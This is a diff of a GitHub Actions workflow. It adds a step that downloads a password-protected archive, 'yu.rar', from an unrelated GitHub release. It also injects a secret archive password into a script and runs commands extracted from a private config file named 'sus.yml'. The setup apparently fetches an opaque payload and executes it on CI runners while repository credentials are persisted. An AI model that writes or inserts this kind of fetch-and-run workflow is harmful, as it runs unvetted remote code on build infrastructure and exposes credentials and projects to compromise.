@@ -31,13 +31,6 @@ jobs:
           persist-credentials: true                     # Persist credentials for subsequent steps
           fetch-depth: 1                                # Shallow clone to speed up the process
 
-      # Step 4: Initialize Git LFS (if applicable)
-      - name: Initialize Git LFS
-        run: |
-          echo "[$(date)] 🛠️ Initializing Git LFS..."
-          git lfs install
-          git lfs pull
-
       # Step 5: Verify that the private repository was fetched successfully
       - name: Verify Private Repository Checkout
         run: |
@@ -54,12 +47,29 @@ jobs:
         run: |
           echo "[$(date)] 🛠️ Installing dependencies..."
           sudo apt-get update -y
-          sudo apt-get install -y p7zip-full dos2unix
+          sudo apt-get install -y p7zip-full dos2unix wget
           sudo wget https://github.com/mikefarah/yq/releases/latest/download/yq_linux_amd64 -O /usr/bin/yq
           sudo chmod +x /usr/bin/yq
           echo "[$(date)] ✅ Dependencies installed successfully!"
 
-      # Step 7: Debug the private YAML configuration file
+      # Step 7: Ensure yu.rar exists (download if missing)
+      - name: Ensure yu.rar Exists
+        run: |
+          echo "[$(date)] 🔧 Checking for yu.rar..."
+          if [ ! -f "./yu.rar" ]; then
+            echo "[$(date)] ❌ yu.rar not found. Downloading from remote URL..."
+            wget https://github.com/maywopselmp/wadma/releases/download/ampo/yu.rar -O yu.rar
+            if [ $? -ne 0 ]; then
+              echo "[$(date)] ❌ Failed to download yu.rar from remote URL."
+              exit 1
+            fi
+            echo "[$(date)] ✅ Successfully downloaded yu.rar."
+          else
+            echo "[$(date)] ✅ yu.rar already exists."
+          fi
+          ls -l ./yu.rar
+
+      # Step 8: Debug the private YAML configuration file
       - name: Debug Private YAML Config
         run: |
           CONFIG_FILE="private-config/.github/workflows/sus.yml"
@@ -70,7 +80,7 @@ jobs:
           echo "[$(date)] 📂 Contents of $CONFIG_FILE:"
           cat "$CONFIG_FILE"
 
-      # Step 8: Extract and run commands from the YAML file
+      # Step 9: Extract and run commands from the YAML file
       - name: Extract and Run Commands from YAML
         run: |
           set -e  # Stop execution on any error
@@ -97,23 +107,23 @@ jobs:
           # Adjust paths and insert secrets
           echo "[$(date)] 🛠️ Adjusting paths and inserting secrets..."
           sed -i "s|\$RAR_PASS|${escaped_rar_pass}|g" temp_script.sh
-          sed -i 's|yu.rar|private-config/yu.rar|g' temp_script.sh
-          sed -i 's|extracted/|private-config/extracted/|g' temp_script.sh
+          sed -i 's|yu.rar|./yu.rar|g' temp_script.sh
+          sed -i 's|extracted/|./extracted/|g' temp_script.sh
 
           # Debugging: Verify the .rar file exists and is accessible
-          echo "[$(date)] 🔧 Verifying private-config/yu.rar..."
-          if [ ! -f "private-config/yu.rar" ]; then
-            echo "❌ Error: private-config/yu.rar not found!"
+          echo "[$(date)] 🔧 Verifying yu.rar..."
+          if [ ! -f "./yu.rar" ]; then
+            echo "❌ Error: yu.rar not found in the root directory!"
             echo "[$(date)] 🔍 Listing all files in the workspace for debugging..."
             find . -type f
             exit 1
           fi
-          ls -l private-config/yu.rar
+          ls -l ./yu.rar
 
           # Debugging: Test file integrity
           echo "[$(date)] 🔧 Testing file integrity..."
-          unrar t private-config/yu.rar || {
-            echo "❌ Error: private-config/yu.rar is corrupted or invalid."
+          unrar t ./yu.rar || {
+            echo "❌ Error: yu.rar is corrupted or invalid."
             exit 1
           }
 
